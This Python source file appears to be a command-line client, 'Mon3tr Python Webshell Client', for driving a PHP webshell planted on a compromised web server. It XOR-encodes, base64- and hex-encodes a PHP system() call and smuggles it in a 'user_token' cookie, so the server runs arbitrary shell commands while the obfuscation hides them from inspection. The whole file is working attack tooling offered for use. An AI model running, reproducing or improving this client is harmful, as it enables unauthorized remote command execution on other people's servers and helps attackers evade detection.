import argparse
import requests
import base64

logo = '''\033[1;31;40m
       LLf                                            ,11,      
       LLLLLL,                                     i11111,      
       LLLLLLLLLt                              .111111111,      
       LLLLLLLLLLLLL,                       i111111111111.      
       iLLLLLLLLLLLLLLLt                .1111111111111111       
           LLLLLLLLLLLLLLLL.         ;111111111111111;          
              1LLLLLLLLLLLLLLL1  .1111111111111111              
                 .LLLLLLLLLLLLLL11111111111111;                 
       LLf           tLLLLLLLLLL11111111111.          .11.      
       LLLLLL,          :LLLLLLL1111111i           ;11111.      
       LLLLLLLL             fLLL1111,            :1111111.      
       LLLLLLLL                :1                :1111111.      
       LLLLLLLL      tLt                .11      :1111111.      
       LLLLLLLL      tLLLLL.         ;11111      :1111111.      
       LLLLLLLL      tLLLLLLLL1  .111111111      :1111111.      
       LLLLLLLL      tLLLLLLLLLL11111111111      :1111111.      
       LLLLLLLL      tLLLLLLLLLL11111111111      :1111111.      
       LLLLLLLL      tLLLLLLLLLL11111111111      :1111111.      
       LLLLLLLL      tLLLLLLLLLL11111111111      :1111111,      
       LLLLLLLLLLf   tLLLLLLL, L1: 11111111   ,1111111111.      
       LLLLLLLLLLLLLLtLLLLLLL,     1111111111111111111111,      
        ,LLLLLLLLLLLLLLLLLLLL,     11111111111111111111i        
            fLLLLLLLLLLLLLLLL,     11111111111111111,           
               :LLLLLLLLLLLLL,     11111111111111               
                   LLLLLLLLLL,     1111111111:                  
                      iLLLLLL,     1111111         \033[0m Mon3tr Python Webshell Client \033[1;31;40m
                          LLL,     111:                            \033[0m'''

version = "\033[4;32;40mv0.1\033[0m \
by \
\033[1;37;40mY5neKO\033[0m"

parse = argparse.ArgumentParser(description=logo + version, formatter_class=argparse.RawTextHelpFormatter)

parse.add_argument("-g", "--generate_webshell", action="store", type=str, help="生成webshell的文件名，默认为当前目录下的webshell.php")
parse.add_argument("-w", "--webshell", action="store", type=str, help="webshell路径")
parse.add_argument("-c", "--cmd", action="store", type=str, help="执行命令")
parse.add_argument("-x", "--xor", action="store", type=str, help="xor加密key")

# 接收命令行参数解析后的参数
args = parse.parse_args()


def request(payload):
    url = args.webshell
    headers = {"Content-Type": "application/json;charset=gbk"}
    cookies = {"user_token": payload}
    response = requests.get(url=url, headers=headers, cookies=cookies)
    response.encoding = "gbk"
    return response.text


def xor_decode(string, key):
    str_length = len(string)
    key_length = len(key)
    tmp = 0
    result = ""

    for i in range(0, str_length):
        result += chr(ord(string[i]) ^ ord(key[tmp]))

        if tmp + 1 < key_length:
            tmp += 1
        else:
            tmp = 0

    return result


def payload_generate(cmd, key):
    payload = xor_decode("system('" + cmd + "');", key)
    payload = base64.b64encode(payload.encode("utf-8"))
    payload = payload.hex()
    print(payload)
    return payload


if args.webshell is not None:
    payload1 = payload_generate(args.cmd, args.xor)
    response1 = request(payload1)
    print(response1)
